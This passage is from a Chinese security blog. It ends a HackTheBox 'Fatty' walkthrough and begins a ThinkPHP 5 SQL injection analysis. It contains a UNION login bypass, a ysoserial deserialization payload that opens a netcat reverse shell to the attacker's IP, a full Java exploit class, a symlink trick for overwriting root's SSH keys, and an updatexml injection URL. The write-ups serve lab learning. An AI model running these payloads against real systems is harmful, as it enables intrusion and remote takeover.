class="string">"id"</span>);</span><br><span class="line">            String username = rs.getString(<span class="string">"username"</span>);</span><br><span class="line">            String email = rs.getString(<span class="string">"email"</span>);</span><br><span class="line">            String password = rs.getString(<span class="string">"password"</span>);</span><br><span class="line">            String role = rs.getString(<span class="string">"role"</span>);</span><br><span class="line">            newUser = <span class="keyword">new</span> User(id, username, password, email, Role.getRoleByName(role), <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (newUser.getPassword().equalsIgnoreCase(user.getPassword())) &#123;</span><br><span class="line">                <span class="keyword">return</span> newUser;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FattyDbSession.LoginException(<span class="string">"Wrong Password!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FattyDbSession.LoginException(<span class="string">"Wrong Username!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var11) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.logError(<span class="string">"[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='"</span> + user.getUsername() + <span class="string">"' &lt;=="</span>);</span><br><span class="line">        <span class="keyword">this</span>.logger.logError(<span class="string">"[-] Exception was: '"</span> + var11.getMessage() + <span class="string">"'"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显。登录的位置存在sql注入。具体流程是：执行sql查询,用查询结果来实例化User类。并且调用了一个针对password的检查<code>newUser.getPassword().equalsIgnoreCase(user.getPassword()</code></p><p>这也就代表简单的万能密码不起作用了。为什么呢？我们来看看User类如何实例化的。直接找构造方法<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/7.PNG" alt><br>如果是我们之前那样。直接实例化一个含username,password的User对象。它会检查一个初始化中hash的值是否为false.如果不为false。那么会像上面的构造方法一样将<code>sha256(username+password+&#39;clarabibimakeseverythingsecure&#39;)</code>进行比对。<br>所以如果我们使用<code>&#39; or &#39;1&#39;=&#39;1</code>.那么sql语句返回结果自然是qtc的数据。但是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256(&quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;clarabibimakeseverythingsecure&quot;) &#x3D; sha256(&quot;qtc&quot;+&quot;clarabibi&quot;+&quot;clarabibimakeseverythingsecure&quot;)</span><br></pre></td></tr></table></figure><p>是不成立的。所以我们无法登陆。</p><p>但是不要紧。我们可以在这个sql语句里使用union查询返回一个admin用户。因为它是根据查询结果返回数据来实例化User类进而判断role是否为admin的。我们只需要</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User user=<span class="keyword">new</span> User(<span class="string">" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin"</span>,<span class="string">"byc_404"</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>首先保证User类hash值为false。这样password不会进行sha256赋值。然后由于abc用户不存在。我们union查询返回的值即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,'byc_404','a@b.com','byc_404','admin'</span><br></pre></td></tr></table></figure><p>用户role已经被设为admin了.<br>此时password与password相同。校验通过</p><p>我们更改下exp中user实例化的方法。并且尝试调用admin权限的ipconfig<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/8.PNG" alt></p><p>成功执行。此处还可以从ipconfig中172.28看出来java运行的靶机似乎是docker。</p><p>现在我们就可以尝试changePW进行反序列化了。不过同样由于原始changePW方法只传递一个双参数User对象。那么我们还得重写changePW方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">changePW</span><span class="params">(String payload)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.action=<span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID,<span class="string">"changePW"</span>);</span><br><span class="line"><span class="keyword">this</span>.action.addArgument(payload);</span><br><span class="line"><span class="keyword">this</span>.sendAndRecv();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更改Invoker源码后,然后就是按照上面的流程重新build jar包了。</p><p>重新导入后使用ysoserial生成payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="string">'nc 10.10.14.25 9001 -e /bin/sh'</span> |base64 -w 0</span><br></pre></td></tr></table></figure><p>(docker靶机没有bash…alpine靶机通病。所幸有老版本nc)</p><p>最终的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> htb.fatty.client.connection.Connection;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.client.methods.Invoker;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageBuildException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.message.MessageParseException;</span><br><span class="line"><span class="keyword">import</span> htb.fatty.shared.resources.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn = Connection.getConnection();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] connection failed: "</span>+ e.getMessage());</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[+] Successfully connected"</span>);</span><br><span class="line"></span><br><span class="line">        User user=<span class="keyword">new</span> User(<span class="string">" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin"</span>,<span class="string">"byc_404"</span>,<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn.login(user))&#123;</span><br><span class="line">            System.out.println(<span class="string">"[+] Successfully logged in"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"[-] Login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String rolename=conn.getRoleName();</span><br><span class="line">        user.setRoleByName(rolename);</span><br><span class="line">        System.out.println(<span class="string">"[+] rolename is: "</span>+rolename);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Invoker invoker =<span class="keyword">new</span> Invoker(conn,user);</span><br><span class="line">        String response=<span class="string">""</span>;</span><br><span class="line">        String payload=<span class="string">"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHm5jIDEwLjEwLjE0LjI1IDkwMDEgLWUgL2Jpbi9zaHQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg="</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response=invoker.changePW(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessageParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MessageBuildException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Server response:\n"</span>+ response);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接到回显后使用<code>ash -i 2&gt;&amp;1</code>升级tty.(没有python,socat。但是可以用ash)<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/9.PNG" alt></p><p>user qtc done.</p><p>小结下,这个部分真心困难。假如我没有看wp的话估计早就在中间某个环节放弃了。但是整体流程下来关于java的一些操作让我受益匪浅。尤其是jar包的部分。当然我也希望能找到重写jar包代码的最佳方案。</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>接下来的部分就比较简单了。刚刚我们在start.sh中看到执行的命令除了jar以外还有cron的定时任务。查看下文件发现存在/etc/crontabs.back。其中存在备份的cronjob文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/</span><br></pre></td></tr></table></figure><p>它在定时地将<code>/opt/fatty/logs/</code> 下的内容打包到<code>/opt/fatty/tar/logs.tar</code><br>既然如此我们看看靶机到底对tar文件做了什么</p><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/10.PNG" alt></p><p>可以看到。fatty本机在每隔一分钟使用scp同步文件。那么假如它是root用户在本机调用scp并且执行解包操作。我们就有办法进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /root/.ssh/authorized_keys out/logs.tar</span><br><span class="line">tar -cf logs.tar -C out/ logs.tar </span><br><span class="line">tar -tvf logs.tar</span><br></pre></td></tr></table></figure><p>首先我们创建一个指向root公钥的软链接。并且打包它自己。<br><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/11.PNG" alt><br>可看到此时logs.tar里的内容是一个指向root ssh公钥的软链接。假如我们解压它的话,将得到它本身。<br>接下来我们把它移动到<code>/opt/fatty/tar/logs.tar</code>.那么此时定时任务指执行的话,将把它转移到本机。并且解包，从而得到一个logs.tar文件,并且它是一个指向公钥的软链接。</p><p>接下来。假如我们把docker上的logs.tar换成一个包含我们ssh公钥的文件。那么当cronjob再次执行时,scp会把新的logs.tar 覆盖旧的。而旧的logs.tar是一个指向ssh公钥的软链接</p><p>这样的话思路就非常清楚了。在上面执行完logs.tar后执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp logs.tar &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar </span><br><span class="line"></span><br><span class="line">sleep 60</span><br><span class="line"></span><br><span class="line">echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaTnVHUaEL07CrQQoNh1zhTfnl5m6OGd4HPwmutz2ZkEf5fWSXrtMyrlxvNP5mtinS8vlRgEtF4KAsXkFceq4Ga&#x2F;ahgcYTdcKNFJQiBDz3cC1gu4az4mfdSYGIYav0UAiUel5lWN8SJ8FLUEd1hK85dIMOFLZoKNCO1gm1zOMQFB6A+WVUbchPhLm718YMkAawCHXzxhBEwJuQ1Il7wGWyZaPzuCTR+Dgci4xZDVr7459hfQJpGz7ZmTb9msnlk3Vnd156WnbR95qMkHPlaA0DMKPvs&#x2F;GjBf2dCREGdfZloTDo6yf&#x2F;b3Ev9d4n4EiF53nc38jlxLARckbAZwA15DwS15WbOS31ZV&#x2F;ZOi3YtKSkmA7nMRYoE0QZ5uhRMZySB1FfxtHOkZV+EnXD4WPeZwG23sIpQ3AYjlbuOiybnrK5iuKcf8uclLsvf7ToahPDhZSot2bH8gnS20mcC&#x2F;sb+uLrkdI85Qn8oCe7OoLeF&#x2F;QxESa&#x2F;lIMalSvml6dSvR8ORNk&#x3D; root@byc404&#39; &gt; &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/hackthebox-Fatty-JavaExploits/12.PNG" alt></p><p>rooted.</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  fatty 作为insane难度的靶机确实”实至名归”。java相关的知识恐怕能在一开始就劝退很多人了。不过幸好自己之前学习了java web的一些基础知识,在这里的实际场景才能发挥作用。一次渗透能学到很多知识，确实值得点赞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp-vuln</title>
      <link href="2020/08/05/Thinkphp-vuln/"/>
      <url>2020/08/05/Thinkphp-vuln/</url>
      
        <content type="html"><![CDATA[<p>  这段时间因为一些原因老是有点自我纠结,很大程度上是因为对所计划学习的内容无法定夺的原因。上周因为hw所以错过了wmctf,赛后去看题发现基本都是php之类的,都不是很想看。相对感兴趣的框架的链子自己也没找全。感觉菜的不行,相比几个月前审一些比赛中的框架手生了很多。</p><a id="more"></a><p>  最近因为一直在看Node.js相关的漏洞跟开发去了,加上自己一直对php心里有种厌恶感,导致没有劲头去深入学习。而上周hw的经历让我意识到php仍旧是国内各种网站的大头。所以痛下决心,开始把php跟java的知识同步学习。这里就用红日七月火师傅他们的<a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">thinkphpvuln</a>项目吧。希望能够对代审的功力有所提升。</p><h2 id="tp5-sqli-insert"><a href="#tp5-sqli-insert" class="headerlink" title="tp5-sqli-insert"></a>tp5-sqli-insert</h2><p>安装的话composer 一把梭。具体参见Thinkphp-vuln项目。安装tpdemo<br>5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5 版本间的sql注入漏洞。利用的话需要更改Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        db(<span class="string">'users'</span>)-&gt;insert([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/0.PNG" alt></p><p>注意这是在开启了tp的app_debug情况下的。否则我们的报错注入应该是看不到回显。</p><p>首先我们跟着Index.php中db这行语句,跟进think/db/Query.php的insert函数。<br><img src="/2020/08/05/Thinkphp-vuln/1.PNG" alt><br>执行的sql语句如下。我们必然要跟进这个sql语句研究注入的可能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</span><br></pre></td></tr></table></figure><p>首先 <code>$this-&gt;builder</code> 为\think\db\builder\Mysql 类(这个其实就取决于你连接的数据库类型。稍微往前跟下可以看到) Mysql类继承于Builder类。所以<br>看向Builder的insert函数。</p><p><img src="/2020/08/05/Thinkphp-vuln/2.PNG" alt></p><p>这里先跟进下parseData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取绑定信息</span></span><br><span class="line">    $bind = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind($options[<span class="string">'table'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'*'</span> == $options[<span class="string">'field'</span>]) &#123;</span><br><span class="line">        $fields = array_keys($bind);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $fields = $options[<span class="string">'field'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</span><br><span class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 对象数据写入</span></span><br><span class="line">            $val = $val-&gt;__toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($options[<span class="string">'strict'</span>]) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'fields not exists:['</span> . $key . <span class="string">']'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($val)) &#123;</span><br><span class="line">            $result[$item] = <span class="string">'NULL'</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</span><br><span class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</span><br><span class="line">                    $result[$item] = $val[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($val)) &#123;</span><br><span class="line">            <span class="comment">// 过滤非标量数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> === strpos($val, <span class="string">':'</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;query-&gt;isBind(substr($val, <span class="number">1</span>))) &#123;</span><br><span class="line">                $result[$item] = $val;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $key = str_replace(<span class="string">'.'</span>, <span class="string">'_'</span>, $key);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;query-&gt;bind(<span class="string">'data__'</span> . $key, $val, <span class="keyword">isset</span>($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);</span><br><span class="line">                $result[$item] = <span class="string">':data__'</span> . $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parsedata接受的参数是我们传进的参数useranme数据。简单看下会发现中间的一个for循环是在遍历我们传进的数组并且只是进行一个拼接的操作。最后返回数据。比如我们的payload对应如下。<code>$val[0]=inc</code>,之后返回的<code>$result</code>只是<code>$val[1],$val[2]</code>的拼接。parseKey 方法并没有在处理我们的输入数据后影响什么。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">所以这里处理完后回到insert函数。我们的输入直接送到返回拼接的sql语句。造成sql注入</span><br><span class="line">完整语句不妨直接在debug报错的地方看。会发现回显了sql语句</span><br><span class="line">```sql</span><br><span class="line">INSERT INTO `users` (`username`) VALUES (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>)+<span 